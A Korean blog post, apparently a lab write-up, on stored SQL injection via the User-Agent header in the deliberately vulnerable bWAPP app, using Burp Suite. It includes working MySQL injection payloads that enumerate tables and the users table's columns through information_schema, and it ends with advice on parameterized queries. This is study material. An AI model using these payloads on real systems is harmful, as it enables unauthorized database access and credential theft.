---
layout: post
title: "SQL Injection - Stored (User-Agent)"
date: 2026-11-06
categories: [cyber-security, bWAPP]
tags: [SQL-Injection, Burp-Suite, User-Agent, MySQL, bWAPP]
---

> 실습 환경: 격리된 bWAPP/bee-box (Security Level: Low). 원본 스크린샷 16개는 [Notion 실습 기록](https://app.notion.com/p/410aa16a5aa480f7894ddbe36cd83791)에서 확인할 수 있습니다.

## 개요

bWAPP의 **SQL Injection - Stored (User-Agent)** 시나리오(`sqli_17.php`)를 대상으로 HTTP `User-Agent` 헤더에 삽입한 값이 서버의 SQL 쿼리에 어떤 영향을 미치는지 확인한다. Firefox의 요청을 Burp Suite로 가로채 헤더를 변경하고, MySQL 메타데이터 조회 결과를 관찰한다.

## 실습 준비: Firefox와 Burp Suite

1. bWAPP의 `sqli_17.php`에 접속하고 보안 수준을 **low**로 설정한다.
2. Firefox 주소창에서 `about:preferences#general`로 이동해 **Network Settings**를 연다.
3. HTTP 프록시를 `127.0.0.1:8080`으로 지정한다.
4. Burp Suite의 Proxy Listener가 `127.0.0.1:8080`에서 대기 중인지 확인한다.
5. **Intercept on**으로 전환하고 페이지를 새로고침하여 요청이 잡히는지 확인한다.

이 실습에서 low 수준은 입력값을 충분히 검증하지 않는 흐름을 관찰하기 위한 설정이다.

## User-Agent 헤더의 SQL Injection

요청의 `User-Agent` 값을 변경하여 `information_schema.tables`에 저장된 현재 데이터베이스의 테이블 이름을 조회한다.

```sql
abcd', (SELECT table_name
        FROM information_schema.tables
        WHERE table_schema = database()
        LIMIT 0,1)) #
```

이 문자열은 독립적으로 실행하는 SQL 문장이 아니라, **취약한 서버 측 쿼리의 문자열 결합 위치**에 삽입되는 페이로드다. 작은따옴표(`'`)는 기존 문자열을 닫고, 서브쿼리는 메타데이터에서 값을 가져오며, `#`은 뒤따르는 SQL 구문을 주석 처리한다. 실제 유효성은 서버의 원래 쿼리 구조에 따라 달라진다.

Burp Suite에서 헤더를 수정한 뒤 **Forward**하고 bWAPP 화면에 반영된 결과를 확인한다.

## LIMIT으로 테이블 목록 순회

`LIMIT offset, count`에서 `offset`을 증가시키면 한 번에 한 행씩 확인할 수 있다.

```sql
abcd', (SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 1,1)) #
abcd', (SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 2,1)) #
abcd', (SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 3,1)) #
abcd', (SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 4,1)) #
```

`LIMIT`에 `ORDER BY`가 없으면 행의 반환 순서는 보장되지 않는다. 재현성 있는 실습에서는 정렬 기준을 명시하는 편이 좋다.

## GROUP_CONCAT으로 컬럼 확인

`information_schema.columns`에서 `users` 테이블의 컬럼명을 합쳐 확인한다.

```sql
abcd', (SELECT GROUP_CONCAT(column_name)
        FROM information_schema.columns
        WHERE table_schema='bWAPP'
          AND table_name='users')) #
```

원본 실습에서 확인한 컬럼:

```text
id, login, password, email, secret, activation_code, act
```

스키마를 조회하는 별도 예시:

```sql
abcd', (SELECT TABLE_SCHEMA
        FROM information_schema.tables
        WHERE table_name='users'
        LIMIT 0,1)) #
```

## 관찰 및 주의사항

- 이 실습의 입력 지점은 URL 파라미터가 아닌 HTTP `User-Agent` 헤더다.
- SQL 문자열 결합이 발생하는 맥락과 결과가 저장·표시되는 맥락을 구분해야 한다.
- `information_schema.tables`는 테이블 목록을 조회한다. **데이터베이스 목록 자체**는 `information_schema.schemata`를 사용한다.
- 원본 노트 마지막의 `UNION SELECT` 및 PHP 로그인 코드 조각은 다른 실습 맥락이 혼재되어 있어 본문의 재현 절차와 분리했다.
- 실제 애플리케이션에서는 문자열 연결 대신 **prepared statement / parameterized query**를 사용하고, 데이터베이스 계정 권한을 최소화해야 한다.

## 실습 스크린샷

Firefox 프록시 설정, Burp Suite Intercept, 요청 헤더 수정, bWAPP 응답, 테이블 및 컬럼 조회 화면 등 **16개 스크린샷**은 [원본 Notion 페이지](https://app.notion.com/p/410aa16a5aa480f7894ddbe36cd83791)에 보관되어 있다.

---

원본: [SQL Injection - Stored (User-Agent) — Notion](https://app.notion.com/p/410aa16a5aa480f7894ddbe36cd83791)
